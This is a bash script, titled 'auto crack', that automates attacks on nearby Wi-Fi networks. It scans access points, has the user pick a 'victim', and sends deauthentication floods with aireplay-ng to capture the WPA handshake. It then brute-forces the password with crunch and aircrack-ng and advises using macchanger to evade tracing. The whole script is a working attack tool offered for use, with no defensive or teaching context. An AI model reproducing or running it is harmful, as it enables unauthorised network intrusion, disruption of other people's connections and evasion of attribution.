update_system () {
	echo '---Updating system---'
	sudo apt update -y
	sudo apt upgrade -y
	clear
	echo '-system upgraded'
}

install_crunch () {
	echo '---Installing crunch---'
	sudo apt-get update -y
	sudo apt-get install -y crunch
	clear
	echo '-crunch installed'
}

install_aircrack () {
	echo '---Installing aircrack---'
	sudo apt-get update
	sudo apt-get install -y aircrack-ng
	clear
	echo '-aircrack installed'
}

install_firmware_realtek (){
   	echo '---Installing firmware-realtek---'
	sudo apt-get update
    	sudo apt-get install -y firmware-realtek
    	clear
    	echo '-firmware-realtek installed'
}

install_xterm (){
   	echo '---Installing xterm---'
	sudo apt-get update
    	sudo apt-get install -y xterm
    	clear
    	echo '-xterm installed'
}

mon_mode_on () {
	clear
	echo '---Starting monitoring mode---'
	echo ''
	echo '-cature interace'
	int=$(sudo iw dev | awk '$1=="Interface"{print $2}' | head -n1)
	echo "-first interface selected: $int"

	x=$(sudo airmon-ng start $int)
	echo "-starting airmon on $int"

	mon_int=$(sudo iw dev | awk '$1=="Interface"{print $2}' | head -n1)
	echo "-start monitor on interface: $mon_int"

	sudo xterm -e timeout 10 airodump-ng -w mytable --output-format csv --write-interval 1 $mon_int
	echo '-access points captured'

	mytable=$(ls -t mytable* | head -n1)
	echo "-gathering $mytable information"

	#adjusting the table
	sed -n '1,/ESSIDs/p' $mytable > temp && mv temp $mytable
	awk '/ESSIDs/{getline;next} 1' $mytable > temp && mv temp $mytable 
	awk '{print $1,$6,$20}' $mytable > temp && mv temp $mytable 
	awk '/ID-length/{getline;next} 1' $mytable > temp && mv temp $mytable 
	awk 'BEGIN{i=0} /.*/{printf "[%d]\t% s\n",i,$0; i++}' $mytable > temp && mv temp $mytable
	(echo " #,BSSID, , , ch, ESSID" && cat $mytable) > temp && mv temp $mytable
	awk -e 'gsub(/,/, "\t")' $mytable > temp && mv temp $mytable

	echo ''
	cat $mytable #display table

	echo ''
	
	echo -n "Input your victim: "
	read victim
	if [[ ! $victim =~ ^[0-9]+$ ]] ; then
		echo "No good"
		exit
	fi
	(( victim = victim + 1 ))
	victim=$(sed -n "$victim"p "$mytable")
	clear
	echo '-victim has:'
	essid=$(echo $victim | awk '{print $4}')
	ch=$(echo $victim | awk '{print $3}')
	bssid=$(echo $victim | awk '{print $2}')

	echo -e "\tessid is: $essid" 
	echo -e "\tchannel is:  $ch"
	echo -e "\tbssid is:  $bssid"

	dt=$(date '+%s')
	sudo mkdir "$dt"' '"$essid"
	cd "$_"

	#capturing handshake
	echo '-close the 2 small terminals once you see handshake'

	sudo xterm -e airodump-ng --bssid "$bssid" -c "$ch" -w "$essid" "$mon_int" & sudo xterm -e aireplay-ng --deauth 25 -a "$bssid" "$mon_int" #--deauth 0 infinit

	cd ..
	rm mytable*.csv
}

crack_cap () {
	clear
	echo '---Cracking your .cap file---'
	mylist=$(ls -X -1 -d * | awk '{print $2}')
	echo "$mylist" | awk 'BEGIN{i=1} /.*/{printf "[%d]\t% s\n",i,$0; i++}'
	
	read -p 'select your .cap file: ' cap
	path=$(ls -X -1 -d * | sed -n "$cap"p)

	cd "$path"

	cap_file=$(ls *.cap)
	csv_file=$(echo "$cap_file" | sed 's/.cap/.csv/g')

	if grep -Rq "BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key" "$csv_file"
		then
		awk '{print $1}' "$csv_file" > temp && mv temp "$csv_file"
		awk -e 'gsub(/,/, " ")' "$csv_file" > temp && mv temp "$csv_file"
	fi

	echo ''
	echo "-crunch info"
	read -p "minimum length: " min
	read -p "maximum length: " max
	read -p "all characters: " char

	bssid=$(sed -n 2p "$csv_file")

	command="crunch $min $max $char|aircrack-ng -b $bssid -w- $cap_file -l password.txt"

	echo ''
	xterm -e "$command"	
	clear
	FILE="password.txt"
	if [ -f "$FILE" ]; then
		mypass=$(cat "password.txt")
		echo "your password is: $mypass"
		echo "consider using macchanger"
		echo ""
	else 
		echo "password not found try with other crunch info"
	fi

	cd ..	
	exit

}

mon_mode_off () {
	echo '---Monitoring mode off---'
	mon_int=$(sudo iw dev | awk '$1=="Interface"{print $2}' | head -n1)
	sudo airmon-ng stop $mon_int
	clear
	echo '-resumed wifi'
}

display_options () {
	echo ''
	echo '-------------------------------'
	echo '----------auto crack-----------'
	echo '-------------------------------'
	echo ''
	echo ''
   	echo '[1]   update system'
    	echo '[2]   install crunch'
    	echo '[3]   install aircrack'
	echo '[4]   install firmware-realtek'
	echo '[5]   install xterm'
	echo '[6]   monitor, capture access points and capture handshake (prerequisite: xterm, net-tools, aircrack, firmware-realtek, sed, awk, cat)'
	echo '[7]   monitor mode off (prerequisite: net-tools'
	echo '[8]   crack .cap file (prerequisite: crunch, aircrack-ng, cat, grep)'
    	echo '[100] all'

	echo ''
	read -p "Input your choice: " option

	if [ $option -eq 1 ]
		then
		update_system

	elif [ $option -eq 2 ]
		then
		install_crunch

	elif [ $option -eq 3 ]
		then
		install_aircrack

	elif [ $option -eq 4 ]
		then
		install_firmware_realtek

	elif [ $option -eq 5 ]
		then
		install_xterm

	elif [ $option -eq 6 ]
		then
		mon_mode_on

	elif [ $option -eq 7 ]
		then
		mon_mode_off

	elif [ $option -eq 8 ]
		then
		crack_cap

	elif [ $option -eq 100 ]
		then
		update_system
		install_crunch
		install_aircrack
		install_firmware_realtek
		install_xterm
		mon_mode_on
		mon_mode_off
		crack_cap
	else
		echo 'input again'
	fi
	display_options

}


clear
if [ ! -d "wificracking" ]; then
  	mkdir "wificracking"
fi
cd "wificracking"
display_options









